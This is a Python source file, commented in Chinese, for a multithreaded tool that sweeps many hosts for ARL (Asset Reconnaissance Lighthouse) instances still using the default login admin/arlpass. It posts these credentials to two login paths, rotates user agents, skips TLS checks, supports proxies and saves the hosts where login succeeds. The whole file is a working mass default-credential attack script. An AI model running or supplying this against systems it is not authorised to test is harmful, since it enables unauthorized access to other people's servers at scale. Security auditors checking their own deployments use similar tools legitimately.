import requests
import sys
import argparse
import urllib3
import os
import threading
from json import JSONDecodeError
from time import time
from colorama import init, Fore
from tqdm import tqdm
from concurrent.futures import ThreadPoolExecutor, as_completed

# 初始化颜色输出
init(autoreset=True)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# 配置参数
VULNERABLE_PATHS = ["/login", "/api/user/login"]
REQUEST_TIMEOUT = 10
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15"
]


class SmartScanner:
    def __init__(self, username, password, timeout, proxy=None, max_workers=None):
        self.username = username
        self.password = password
        self.timeout = timeout
        self.proxy = {'http': proxy, 'https': proxy} if proxy else None

        # 智能计算线程数
        self.max_workers = self.calculate_workers(max_workers)

        self.results = []
        self.stats = {
            'total': 0,
            'vulnerable': 0,
            'failed': 0
        }
        self.lock = threading.Lock()

    def calculate_workers(self, user_specified):
        """跨平台智能计算最佳线程数"""
        if user_specified:
            return min(user_specified, 50)

        try:
            import psutil
            mem = psutil.virtual_memory()
            mem_gb = mem.total / (1024 ** 3)
        except ImportError:
            mem_gb = 4  # 默认假设4GB内存
            print(Fore.YELLOW + "[!] 建议安装 psutil 库以获得更精确的资源管理 (pip install psutil)")
        except Exception:
            mem_gb = 4  # 异常时回退默认值

        cpu_count = os.cpu_count() or 1

        # 动态调整逻辑
        if mem_gb < 2:
            return min(cpu_count * 2, 8)
        elif mem_gb < 4:
            return min(cpu_count * 3, 16)
        else:
            return min(cpu_count * 4, 32)

    def _check_single_target(self, target):
        """执行单个目标检测"""
        headers = {
            "User-Agent": USER_AGENTS[int(time()) % len(USER_AGENTS)],
            "Content-Type": "application/json; charset=UTF-8"
        }

        for path in VULNERABLE_PATHS:
            url = target.rstrip('/') + path
            data = {"username": self.username, "password": self.password}

            try:
                response = requests.post(
                    url,
                    json=data,
                    headers=headers,
                    verify=False,
                    timeout=self.timeout,
                    proxies=self.proxy
                )

                if response.status_code == 200:
                    try:
                        resp_json = response.json()
                        if resp_json.get("code") == 200 or resp_json.get("status") == "success":
                            return True, path
                    except JSONDecodeError:
                        continue
            except requests.exceptions.RequestException:
                continue

        return False, None

    def _update_stats(self, result):
        """线程安全的状态更新"""
        with self.lock:
            if result:
                self.results.append(result)
                self.stats['vulnerable'] += 1
            else:
                self.stats['failed'] += 1

    def scan(self, targets):
        """执行智能批量扫描"""
        self.stats['total'] = len(targets)

        with tqdm(total=len(targets), desc="扫描进度", unit="target") as pbar:
            with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
                futures = {}

                # 提交扫描任务
                for target in targets:
                    processed_target = target
                    if not target.startswith(('http://', 'https://')):
                        processed_target = f'http://{target}'
                    future = executor.submit(self._check_single_target, processed_target)
                    futures[future] = processed_target

                # 处理结果
                for future in as_completed(futures):
                    target = futures[future]
                    try:
                        is_vuln, _ = future.result()
                        self._update_stats(target if is_vuln else None)
                    except Exception as e:
                        self._update_stats(None)
                    finally:
                        pbar.update(1)


def main():
    banner()

    parser = argparse.ArgumentParser(description='智能版灯塔(ARL)弱口令检测工具')
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument('-u', '--url', help='单个目标URL')
    group.add_argument('-f', '--file', help='包含多个目标的文件')
    parser.add_argument('-o', '--output', help='漏洞结果输出文件', default='results.txt')
    parser.add_argument('--user', help='指定用户名', default='admin')
    parser.add_argument('--pass', dest='password', help='指定密码', default='arlpass')
    parser.add_argument('--timeout', type=int, help='请求超时时间(秒)', default=10)
    parser.add_argument('--proxy', help='使用代理 (e.g. http://127.0.0.1:8080)')
    parser.add_argument('--threads', type=int, help='手动指定最大线程数')

    args = parser.parse_args()

    # 初始化智能扫描器
    scanner = SmartScanner(
        username=args.user,
        password=args.password,
        timeout=args.timeout,
        proxy=args.proxy,
        max_workers=args.threads
    )

    # 处理目标列表
    targets = []
    if args.url:
        targets.append(args.url)
    elif args.file:
        try:
            with open(args.file, 'r') as f:
                targets = [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            print(Fore.RED + f"[错误] 文件 {args.file} 不存在")
            sys.exit(1)

    # 执行扫描
    print(Fore.CYAN + f"[*] 初始化扫描器 (线程数: {scanner.max_workers})")
    scanner.scan(targets)

    # 保存结果
    if scanner.results:
        with open(args.output, 'w') as f:
            for result in scanner.results:
                f.write(f"{result}\n")

    # 显示统计信息
    print("\n" + Fore.CYAN + "扫描统计:")
    print(Fore.WHITE + f"• 总目标数: {scanner.stats['total']}")
    print(Fore.GREEN + f"• 存在漏洞: {scanner.stats['vulnerable']}")
    print(Fore.YELLOW + f"• 检测失败: {scanner.stats['failed']}")
    print(Fore.CYAN + f"\n结果已保存到: {args.output}")


def banner():
    print(Fore.CYAN + '''
+---------------------------------------------------+
| 智能版灯塔(ARL)弱口令检测脚本 v3.1                 |
| 更新说明:                                         |
| • 全平台兼容支持                                  |
| • 智能资源管理                                    |
| • 动态线程池调整                                  |
| • 自动故障转移机制                                |
+---------------------------------------------------+
''' + Fore.RESET)


if __name__ == "__main__":
    main()